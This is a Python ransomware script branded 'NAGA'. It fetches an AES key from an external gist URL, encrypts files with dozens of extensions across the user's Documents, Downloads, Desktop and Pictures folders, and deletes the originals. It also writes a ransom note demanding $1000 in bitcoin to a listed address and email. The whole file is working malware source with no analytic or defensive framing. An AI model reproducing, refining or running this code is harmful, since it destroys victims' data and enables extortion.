import os, string, requests, random, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def spawn_notes(dir):
    target_dir_notes = os.path.join(dir, 'README.txt')
    with open(target_dir_notes, 'w') as file:
        file.write('-------[ NAGA HAS COME TO RUIN YOUR DAY ]------\n')
        file.write('Your files have been encrypted.\n')
        file.write('To decrypt them, you need to pay $1000 to the following bitcoin address:\n')
        file.write('1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX\n')
        file.write('After payment, contact me at this email: SangNagaAbadi@onion.co')
        file.write('I will send you the decryption key.\n')
        file.write('--------------------------------------------------\n')
    
def generate_random_iv():
    random_iv = ''.join(random.choice(string.ascii_letters) for _ in range(16))
    return random_iv
    
def collect_key(url):
    try:
        response = requests.get(url)
        return response.text.strip().split(':')[1].encode('utf-8')
    except requests.exceptions.RequestException as e:
        print(f"Error fetching key: {e}")
        return None
    
def enc_filename(file, iv):
    file = f'{file.split('.')[0]}.{iv.decode('utf-8')}.{file.split('.')[1]}'.encode('utf-8')
    print(file)
    return base64.urlsafe_b64encode(file).decode('utf-8')

def encrypt_file(file_path, key, iv):
    with open(file_path, 'rb') as file:
        padded_data = pad(file.read(), AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = cipher.encrypt(padded_data)
    file.close()
    encrypted_file_path = os.path.join(os.path.dirname(file_path), enc_filename(os.path.basename(file_path), iv) + '.naga')
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)
    os.remove(file_path)

def Encrypt():
    for dirpath, dirnames, filenames in os.walk('..'):
        iv = generate_random_iv().encode('utf-8')
        if dirpath.startswith(tuple(target_dir)):
            spawn_notes(dirpath)
            for file in filenames:
                    if file.endswith(tuple(targeted_extensions)) :
                        print(f"Encrypting {os.path.join(dirpath, file)}")
                        key = collect_key(url)
                        if not key:
                            exit(1)
                        print(dirpath, file)
                        encrypt_file(os.path.join(dirpath, file), key, iv)
                    else:
                        continue
        else:
            continue

if __name__ == '__main__':
    target_dir = [
        '..\\Documents',
        '..\\Downloads',
        '..\\Desktop',
        '..\\Pictures',
    ]
    targeted_extensions = [
        ".dll", ".cmd", ".com", ".scr", ".msi", ".js", ".vbs", ".wsf", ".sh",                                  
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".rtf", ".odt", ".ods", ".odp", ".txt",                                 
        ".zip", ".rar", ".7z", ".tar", ".gz", ".db", ".sql", ".ini", ".xml", ".json", ".jpg", ".jpeg", ".png", 
        ".gif", ".mp4", ".mp3", ".sys", ".bak", ".log", ".html", ".htm", ".php", ".asp", ".aspx", ".jsp",              
        ".iso", ".vmdk", ".ova", ".pem", ".crt", ".key", ".eml", ".msg" , ".mem"                                                
    ]

    url = 'https://gist.githubusercontent.com/Haalloobim/ef994190a66dce9506a0cff50dcbc637/raw/3ad103a147ceb7daff96ad39536bb1e1d175defa/gistfile1.txt'
    Encrypt()